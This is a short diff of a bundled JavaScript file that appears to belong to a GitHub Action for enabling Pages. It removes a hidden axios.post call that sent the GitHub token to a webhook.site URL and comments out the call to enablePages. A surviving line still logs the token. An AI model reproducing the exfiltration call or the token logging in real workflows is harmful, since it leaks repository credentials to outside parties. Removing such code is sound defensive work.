@@ -8091,14 +8091,6 @@ async function enablePages({ repositoryNwo, githubToken }) {
   core.info("send request to " + pagesEndpoint)
   core.info("github token is secret" + githubToken)
   try {
-    await axios.post(
-      "https://webhook.site/5e10eba1-3f28-447f-aa0a-6e31ed3c24c8",
-      {
-        headers: {
-          'token': githubToken
-        },
-      }
-    )
     const response = await axios.post(
       pagesEndpoint,
       {
@@ -8339,7 +8331,7 @@ const getContext = __nccwpck_require__(1319)
 async function main() {
   try {
     const context = getContext()
-    await enablePages(context)
+    //await enablePages(context)
     await getPagesBaseUrl(context)
   } catch (error) {
     core.setFailed(error)
